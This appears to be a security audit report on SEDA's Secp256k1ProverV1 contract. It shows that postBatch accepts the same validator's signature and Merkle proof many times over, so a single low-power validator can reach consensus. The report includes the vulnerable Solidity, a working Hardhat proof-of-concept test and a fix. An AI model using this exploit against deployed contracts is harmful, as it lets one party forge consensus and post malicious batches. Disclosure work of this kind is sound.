High Ash Jay

High

# Single validator can reach consensus by posting a batch with duplicated signature

# Description

In the EVM `Secp256k1ProverV1` contract, the purpose of the `postBatch` function is "verification to validate batch signatures and confirm that they meet the required consensus threshold".

The issue is a missing duplication check. As a result, one single validator with only one signature with a `votingPower > 0` can reach a consensus threshold and post a batch.

----

See the implementation of the function. First we check the `height`, then the length equality of arrays.
After that, in the loop we call two pure function (state does not change, which means there is nothing to prevent iterating over the same validator) and increase the voting power. However as mentioned before, there is no code to prevent using duplicated elements in arrays.

```solidity
signatures = ["Sig1", "Sig1", "Sig1", "Sig1"]
validatorProofs = [Val1, Val1, Val1, Val1]
```

```solidity
function postBatch(
        SedaDataTypes.Batch calldata newBatch,
        bytes[] calldata signatures,
        SedaDataTypes.ValidatorProof[] calldata validatorProofs
    ) external override(ProverBase) whenNotPaused {
        Secp256k1ProverStorage storage s = _storageV1();
        // Prevents replay attacks via strictly ordered batches
        if (newBatch.batchHeight <= s.lastBatchHeight) {
            revert InvalidBatchHeight();
        }
        // Each signature needs a validator Merkle Proof
        if (signatures.length != validatorProofs.length) {
            revert MismatchedSignaturesAndProofs();
        }

        bytes32 batchId = SedaDataTypes.deriveBatchId(newBatch);

        // Accumulate voting power from valid validators to ensure sufficient consensus
        // Each validator must prove membership and provide a valid signature
        uint64 votingPower = 0;
        for (uint256 i = 0; i < validatorProofs.length; i++) {
            // Verify validator is part of the current validator set using Merkle proof
            if (!_verifyValidatorProof(validatorProofs[i], s.lastValidatorsRoot)) { // pure 
                revert InvalidValidatorProof();
            }
            // Verify signature is valid and signed by the validator
            if (!_verifySignature(batchId, signatures[i], validatorProofs[i].signer)) { // pure
                revert InvalidSignature();
            }
            votingPower += validatorProofs[i].votingPower;
        }

        // Check that voting power meets or exceeds the consensus threshold (2/3)
        if (votingPower < CONSENSUS_PERCENTAGE) {
            revert ConsensusNotReached();
        }

        // After consensus is reached, commit the new batch and update validator set
        // This establishes the new state for future batch validations
        s.lastBatchHeight = newBatch.batchHeight;
        s.lastValidatorsRoot = newBatch.validatorsRoot;
        s.batches[newBatch.batchHeight] = BatchData({resultsRoot: newBatch.resultsRoot, sender: msg.sender});
        emit BatchPosted(newBatch.batchHeight, batchId, msg.sender);
    }
```
[Secp256k1ProverV1.sol#L90C1-L134C1](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L90C1-L134C1)

# PoC
Paste the PoC in `seda-evm-contracts/test/prover/Secp256k1ProverV1.test.ts` in the block `describe('batch management', () => {` line 35

```typescript
    // ------------------------------------------------------------------------------------------
    it('BUG: allows reusing the same validator multiple times to inflate voting power', async () => {
      const { prover, wallets, data } = await loadFixture(deployProverFixture);
      const { newBatchId, newBatch } = generateNewBatchWithId(data.initialBatch);


      // wallet[0] has 75% vtoing pover
      // the rest of 25% is distributed among the rest 3
      // so we use wallet[1] which has around 8%
      const singleSig = await wallets[1].signingKey.sign(newBatchId).serialized;

      // PoC 
      // Duplicate signature 10 times
      const repeatedSignatures = [
        singleSig, 
        singleSig, 
        singleSig, 
        singleSig, 
        singleSig, 
        singleSig, 
        singleSig,
        singleSig,
        singleSig,
        singleSig];

      // Duplicate the validatorProof[1] 10 times as well
      // (proof for wallets[1])
      const repeatedProofs = [
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
        data.validatorProofs[1],
      ];


      // This will fail not reaching the consensus
      // Comment out PoC and run code bellow to check
      // ------------------
      // const repeatedSignatures = [singleSig];

      // const repeatedProofs = [
      //   data.validatorProofs[1]
      //  ];
      // ------------------


      // This should revert in a well-designed contract, because it’s the same validator
      // repeated 10 times. But in the current code it *will* pass (inflates the voting power).
      await expect(prover.postBatch(newBatch, repeatedSignatures, repeatedProofs))
        .to.emit(prover, 'BatchPosted') // This means it actually succeeds

      
      // Prove the contract accepted the inflated voting power
      const lastBatchHeight = await prover.getLastBatchHeight();
      expect(lastBatchHeight).to.equal(newBatch.batchHeight);
    });
    // ------------------------------------------------------------------------------------------
```

# Impact
One validator with low voting power can bypassing consensus and propose malicious batch: High

# Recommendation
Check for duplicates. Example implementation:

```solidity
address signer = validatorProofs[i].signer;
// revert if we’ve already seen this validator
if (seenValidators[signer]) {
    revert("Validator duplicated");
}
seenValidators[signer] = true;
```